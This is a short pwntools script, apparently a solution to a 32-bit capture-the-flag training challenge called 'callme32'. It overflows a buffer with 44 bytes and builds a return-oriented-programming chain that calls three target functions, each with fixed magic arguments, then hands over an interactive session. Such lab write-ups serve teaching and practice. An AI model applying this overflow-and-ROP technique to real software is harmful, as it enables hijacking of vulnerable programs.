from pwn import *

p = process('./callme32')
e = ELF('./callme32')
r = ROP(e)

payload = b'A' * 44
pop_esi_edi_ebp = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret']).address

payload += p32(e.symbols['callme_one'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

payload += p32(e.symbols['callme_two'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

payload += p32(e.symbols['callme_three'])
payload += p32(pop_esi_edi_ebp)
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)
payload += p32(0xD00DF00D)

p.send(payload)
p.interactive()
